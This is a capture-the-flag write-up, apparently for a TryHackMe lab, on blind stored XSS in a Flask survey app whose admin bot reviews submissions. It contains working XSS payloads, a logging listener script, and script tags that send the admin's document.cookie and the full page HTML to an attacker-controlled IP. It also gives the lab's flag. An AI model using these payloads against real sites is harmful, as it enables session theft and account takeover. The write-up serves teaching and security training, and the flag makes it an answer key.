# Cupid's Matchmaker — Stored/Blind XSS Writeup

## 1. Recon

### 1.1 Fingerprint the app

```bash
curl -s -i http://10.49.146.2:5000/ | head -20
```

Key response headers:

```
Server: Werkzeug/3.0.1 Python/3.12.3
Vary: Cookie
```

→ A **Flask** app (Werkzeug dev server, Jinja2 templating). The landing page is "Cupid's Matchmaker" and repeatedly stresses *"No Algorithms. No AI. Just Real Human Matchmakers"* and *"Our team reads every word"* / *"typically reviews submissions within a minute."*

That phrasing is the big hint: **a reviewer (bot) will open our input on their side.** Classic setup for stored/blind XSS.

### 1.2 Map the endpoints

```bash
for p in admin login survey submissions review dashboard robots.txt flag logout \
         admin/submissions admin/dashboard static/js/main.js; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://10.49.146.2:5000/$p")
  echo "$code  /$p"
done
```

| Code | Path | Notes |
|------|------|-------|
| 200 | `/survey` | Public survey form (`POST`) |
| 200 | `/login` | "Admin Login — Matchmaking team members only" |
| 302 | `/admin` | Redirects to `/login` (auth required) |
| 302 | `/admin/submissions` | Redirects to `/login` (auth required) |
| 302 | `/logout` | Session present |
| 200 | `/static/js/main.js` | Only cosmetic flash-message JS |

So there is an **authenticated admin area** (`/admin`, `/admin/submissions`) that reviews what we submit. We can't reach it directly — but the reviewer bot can.

### 1.3 Inspect the survey form

```bash
curl -s http://10.49.146.2:5000/survey
```

The form `POST`s to `/survey` with these fields (all free-text except the selects):

- `name`, `age`, `gender`, `seeking`
- `ideal_date`, `describe_yourself`, `looking_for`, `dealbreakers`

Submitting returns `302 → /` with a flash message, so submissions are **stored** (blind — we never see them reflected back to us).

---

## 2. Prove the reviewer bot executes our JavaScript (blind XSS)

Because the vuln is blind, we need an **out-of-band (OOB)** callback: store payloads that make the admin's browser contact a server we control, then watch for the hit.

### 2.1 Find our callback IP

```bash
ip -4 addr show tun0 | grep inet
# inet 192.168.137.46/18 ... tun0
```

Our THM VPN IP is `192.168.137.46`. The target bot must be able to reach it (confirmed later — it could).

### 2.2 Start a logging HTTP listener

`logserver.py` — a tiny HTTP server that logs method, path, User-Agent and body of every incoming request to `hits.log`:

```python
# logserver.py
from http.server import BaseHTTPRequestHandler, HTTPServer
import datetime

class H(BaseHTTPRequestHandler):
    def _h(self):
        with open("hits.log", "a") as f:
            f.write(f"{datetime.datetime.now()} {self.command} {self.path} "
                    f"UA={self.headers.get('User-Agent')}\n")
            l = int(self.headers.get('Content-Length', 0) or 0)
            if l:
                f.write("BODY=" + self.rfile.read(l).decode('utf-8', 'replace') + "\n")
        self.send_response(200)
        self.send_header('Content-Type', 'text/plain')
        self.end_headers()
        self.wfile.write(b"ok")
    def do_GET(self):  self._h()
    def do_POST(self): self._h()
    def log_message(self, *a): pass   # silence default stderr logging

HTTPServer(("0.0.0.0", 8000), H).serve_forever()
```

Run it:

```bash
python3 logserver.py        # listens on 0.0.0.0:8000, appends to ./hits.log
```

> **Why a custom server and not just `nc`?** We need to receive **many** requests over several bot cycles, read POST bodies (for exfiltrated HTML), and keep a timestamped log. A one-shot `nc -lvnp` would die after the first connection.

### 2.3 Store probe payloads in every field

We put a **different** payload (with a unique path marker) in each field, so the callback path tells us exactly which field/sink executed:

```bash
CB="http://192.168.137.46:8000"
curl -s -o /dev/null -w "submit: %{http_code}\n" -X POST http://10.49.146.2:5000/survey \
  --data-urlencode "name=<img src=x onerror=\"fetch('$CB/img_onerror')\">" \
  --data-urlencode "age=25" \
  --data-urlencode "gender=Male" \
  --data-urlencode "seeking=Female" \
  --data-urlencode "ideal_date=<script>fetch('$CB/script_tag')</script>" \
  --data-urlencode "describe_yourself=kind<svg/onload=fetch('$CB/svg_onload')>" \
  --data-urlencode "looking_for=someone {{7*7}}" \
  --data-urlencode "dealbreakers=<iframe src=\"$CB/iframe\"></iframe>"
```

> `--data-urlencode` is used so the special characters (`<`, `>`, `{`, spaces) are sent intact and URL-encoded by curl, not mangled by the shell.
> `{{7*7}}` was a throwaway SSTI probe — it never evaluated, confirming the bug is **client-side XSS, not server-side template injection.**

### 2.4 Watch for the callback

```bash
# wait and inspect
grep -v selftest hits.log
```

Within ~70 seconds, the log showed:

```
GET /script_tag  UA=Mozilla/5.0 (X11; Linux x86_64) ... HeadlessChrome/144.0.0.0 Safari/537.36
GET /img_onerror UA=... HeadlessChrome/144 ...
GET /iframe      UA=... HeadlessChrome/144 ...
GET /svg_onload  UA=... HeadlessChrome/144 ...
```

**Confirmed:**
- The reviewer is **HeadlessChrome** (a real browser bot, not a text parser).
- It can reach our listener (OOB works across the VPN).
- **Every field is an unescaped XSS sink** — `<script>`, `<img onerror>`, `<svg onload>`, and `<iframe>` all fired.
- The bot re-opens the page on a loop (a new burst every ~72 s).

---

## 3. Weaponize: exfiltrate the admin context

Now escalate from "JS runs" to "steal admin data". A stored `<script>` running on the admin's `/admin/submissions` page can read anything same-origin: the page HTML **and** `document.cookie`.

```bash
CB="http://192.168.137.46:8000"
curl -s -o /dev/null -w "payload: %{http_code}\n" -X POST http://10.49.146.2:5000/survey \
  --data-urlencode "name=NT" \
  --data-urlencode "age=30" --data-urlencode "gender=Male" --data-urlencode "seeking=Female" \
  --data-urlencode "ideal_date=<script>new Image().src='$CB/XSS_COOKIE?c='+encodeURIComponent(document.cookie)+'&u='+encodeURIComponent(location.href)</script>" \
  --data-urlencode "describe_yourself=nt" \
  --data-urlencode "looking_for=<script>fetch('$CB/HTML',{method:'POST',body:document.documentElement.outerHTML}).catch(e=>{})</script>" \
  --data-urlencode "dealbreakers=nt"
```

**Payload explanation:**

| Snippet | Purpose |
|---------|---------|
| `new Image().src='.../XSS_COOKIE?c='+encodeURIComponent(document.cookie)` | Leaks the admin page's cookies to us via an image GET (no CORS restriction on the request itself). |
| `+'&u='+encodeURIComponent(location.href)` | Also leaks the exact admin URL the bot is viewing — confirms origin/context. |
| `fetch('.../HTML',{method:'POST',body:document.documentElement.outerHTML})` | POSTs the **entire rendered admin page HTML** back to us (useful if the flag were in the page body instead of a cookie). |
| `.catch(e=>{})` | Prevents an unhandled rejection from aborting the rest of the script. |

> **Why `new Image()` for the cookie?** It's the most reliable cross-origin beacon — the browser issues the GET before any CORS check can block it, and we only need the request's query string, not the response.

---

## 4. Capture the flag

After the next bot cycle, `hits.log` contained:

```
GET /XSS_COOKIE?c=flag%3DTHM%7BXSS_CuP1d_Str1k3s_Ag41n%7D&u=http%3A%2F%2Flocalhost%3A5000%2Fadmin%2Fsubmissions
POST /HTML   BODY=<full admin /admin/submissions page HTML>
```

URL-decode the captured cookie:

```bash
python3 -c "import urllib.parse as u; print(u.unquote('flag%3DTHM%7BXSS_CuP1d_Str1k3s_Ag41n%7D&u=http%3A%2F%2Flocalhost%3A5000%2Fadmin%2Fsubmissions'))"
# flag=THM{XSS_CuP1d_Str1k3s_Ag41n}&u=http://localhost:5000/admin/submissions
```

The admin bot's browser, on origin `http://localhost:5000/admin/submissions`, held a non-`HttpOnly` cookie:

```
flag=THM{XSS_CuP1d_Str1k3s_Ag41n}
```

### 🚩 Flag

```
THM{XSS_CuP1d_Str1k3s_Ag41n}
```

---

## 5. Cleanup

```bash
# stop the listener and any leftover helper processes
pkill -f logserver.py
```
